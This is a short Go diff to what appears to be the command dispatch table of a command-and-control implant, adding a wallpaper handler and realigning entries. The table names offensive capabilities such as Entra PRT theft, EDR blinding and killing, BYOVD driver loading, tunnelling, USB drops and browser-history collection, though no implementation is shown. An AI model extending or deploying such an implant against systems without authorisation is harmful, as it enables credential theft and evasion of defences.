@@ -31,6 +31,7 @@ func init() {
 		"reg_set":                handleRegSet,
 		"reg_delete":             handleRegDelete,
 		"reboot":                 handleReboot,
+		"wallpaper":              handleWallpaper,
 		"shutdown":               handleShutdown,
 		"drives":                 handleDrives,
 		"beacon_now":             handleBeaconNow,
@@ -272,10 +273,10 @@ func init() {
 		// Credential Check
 		"cred_check": handleCredCheck,
 
-		"tun_start":   handleTunStart,
-		"tun_stop":    handleTunStop,
-		"sccm_recon":  handleSccmRecon,
-		"entra_prt":   handleEntraPRT,
+		"tun_start":  handleTunStart,
+		"tun_stop":   handleTunStop,
+		"sccm_recon": handleSccmRecon,
+		"entra_prt":  handleEntraPRT,
 
 		// EDR pack (experimental, Windows-only; blind/kill/byovd are
 		// approval-gated server-side)
@@ -284,12 +285,12 @@ func init() {
 		"byovd_load": handleBYOVDLoad,
 		"ppl_check":  handlePPLCheck,
 
-		"file_hunt":             handleFileHunt,
-		"screen_trigger_start":  handleScreenTriggerStart,
-		"screen_trigger_stop":   handleScreenTriggerStop,
-		"usb_enum":              handleUSBEnum,
-		"usb_drop":              handleUSBDrop,
-		"browser_history":       handleBrowserHistory,
-		"session_recon":         handleSessionRecon,
+		"file_hunt":            handleFileHunt,
+		"screen_trigger_start": handleScreenTriggerStart,
+		"screen_trigger_stop":  handleScreenTriggerStop,
+		"usb_enum":             handleUSBEnum,
+		"usb_drop":             handleUSBDrop,
+		"browser_history":      handleBrowserHistory,
+		"session_recon":        handleSessionRecon,
 	}
 }
